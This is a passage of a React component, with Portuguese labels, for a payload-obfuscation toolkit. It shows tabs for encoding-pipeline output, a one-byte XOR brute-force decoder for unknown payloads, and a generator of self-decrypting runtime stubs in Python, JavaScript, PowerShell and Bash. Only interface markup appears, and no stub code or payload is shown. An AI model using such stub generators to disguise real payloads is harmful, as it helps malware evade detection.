              <div key={idx} className="bg-[#121218] border border-[#22222d] rounded-2xl p-4 space-y-2 shadow-md">
                <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2 text-xs font-mono">
                  <div className="flex items-center gap-2">
                    <span className="w-6 h-6 rounded-lg bg-amber-500/20 text-amber-300 font-bold flex items-center justify-center text-xs border border-amber-500/30">
                      #{idx + 1}
                    </span>
                    <span className="font-bold text-white">{st.stepName}</span>
                    <span className="text-[11px] text-zinc-500">• {st.description}</span>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-zinc-400">{st.byteLength} bytes</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(`pipe-step-${idx}`, st.output)}
                      className="px-2 py-0.5 rounded bg-[#1c1c28] hover:bg-[#28283a] text-zinc-300 text-xs font-mono flex items-center gap-1 border border-[#2a2a3c] transition-colors cursor-pointer"
                    >
                      {copiedKey === `pipe-step-${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                </div>

                <pre className="p-3 rounded-xl bg-[#0a0a0f] border border-[#1e1e2a] text-amber-300 font-mono text-xs overflow-x-auto break-all leading-relaxed">
                  {st.output}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 3: XOR DECODER & BRUTE-FORCE SCANNER */}
      {/* ========================================================================= */}
      {activeTab === 'XOR_BRUTE_FORCE' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="space-y-0.5">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Search className="w-4 h-4 text-amber-400" />
                  <span>Scanner de Força-Bruta XOR de 1 Byte (0x01 a 0xFF)</span>
                </h3>
                <p className="text-xs text-zinc-400">
                  Descriptografe payloads desconhecidos testando automaticamente todas as 255 chaves single-byte e classificando por legibilidade ASCII e palavras-chave.
                </p>
              </div>

              <div className="flex items-center gap-1">
                {(['hex', 'base64'] as const).map(fmt => (
                  <button
                    key={fmt}
                    type="button"
                    onClick={() => setBruteInputFormat(fmt)}
                    className={`px-3 py-1 rounded-lg text-xs font-mono font-bold uppercase transition-all ${
                      bruteInputFormat === fmt ? 'bg-amber-500 text-black' : 'bg-[#181824] text-zinc-400'
                    }`}
                  >
                    Formato: {fmt}
                  </button>
                ))}
              </div>
            </div>

            <textarea
              rows={3}
              value={bruteInput}
              onChange={e => setBruteInput(e.target.value)}
              placeholder={bruteInputFormat === 'hex' ? 'Cole o ciphertext em hex (ex: 1b3c37...)' : 'Cole o ciphertext em Base64...'}
              className="w-full px-3.5 py-2.5 rounded-xl bg-[#0c0c10] border border-[#232330] text-amber-300 font-mono text-xs focus:outline-none focus:border-amber-500/50 resize-none leading-relaxed"
            />
          </div>

          {/* Candidate Results Grid */}
          <div className="space-y-3">
            <div className="flex items-center justify-between text-xs font-mono text-zinc-400">
              <span className="font-bold text-white">Melhores Candidatos de Descriptografia XOR:</span>
              <span>{bruteForceCandidates.length} hipóteses avaliadas</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {bruteForceCandidates.map(c => (
                <div key={c.key} className="bg-[#121218] border border-[#22222d] rounded-2xl p-4 space-y-2 shadow-md">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-amber-500/15 border border-amber-500/30 text-amber-400 font-bold">
                        Chave {c.hexKey} ({c.charKey})
                      </span>
                      <span className="text-[10px] text-zinc-500">Score ASCII: {c.asciiScore}%</span>
                    </div>

                    <button
                      type="button"
                      onClick={() => handleCopy(`cand-${c.key}`, c.decryptedText)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === `cand-${c.key}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>

                  <pre className="p-3 rounded-xl bg-[#0c0c10] border border-[#1e1e28] text-emerald-300 font-mono text-xs overflow-x-auto break-all">
                    {c.decryptedText}
                  </pre>
                </div>
              ))}

              {bruteForceCandidates.length === 0 && (
                <div className="col-span-2 text-center py-8 text-zinc-500 text-xs font-mono bg-[#121218] border border-[#22222d] rounded-2xl">
                  Formato de entrada inválido ou sem dados para brute force.
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 4: RUNTIME SELF-DECRYPTING STUBS */}
      {/* ========================================================================= */}
      {activeTab === 'STUBS' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="space-y-0.5">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Code2 className="w-4 h-4 text-amber-400" />
                  <span>Gerador de Stubs de Auto-Descriptografia (PoC & Simulação)</span>
                </h3>
                <p className="text-xs text-zinc-400">
                  Gere o código correspondente para que a aplicação cliente ou script alvo execute a decodificação em tempo de execução.
                </p>
              </div>

              <div className="flex items-center gap-1">
                {(['python', 'javascript', 'powershell', 'bash'] as const).map(lang => (
                  <button
                    key={lang}
                    type="button"
                    onClick={() => setStubLanguage(lang)}
                    className={`px-3 py-1 rounded-lg text-xs font-mono font-bold uppercase transition-all ${
                      stubLanguage === lang ? 'bg-amber-500 text-black shadow-sm' : 'bg-[#181824] text-zinc-400 hover:text-zinc-200'
                    }`}
                  >
                    {lang}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs font-mono text-zinc-400">
                <span>Código Fonte Pronto ({stubLanguage.toUpperCase()}):</span>
                <button
                  type="button"
                  onClick={() => handleCopy('stub-code', runtimeStubCode)}
                  className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#202030] text-zinc-300 text-xs font-mono flex items-center gap-1 border border-[#252538] transition-colors cursor-pointer"
                >
                  {copiedKey === 'stub-code' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>Copiar Stub</span>
                </button>
              </div>

              <pre className="p-4 rounded-xl bg-[#0a0a0f] border border-[#1e1e28] text-amber-300 font-mono text-xs overflow-x-auto leading-relaxed">
                {runtimeStubCode}
              </pre>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
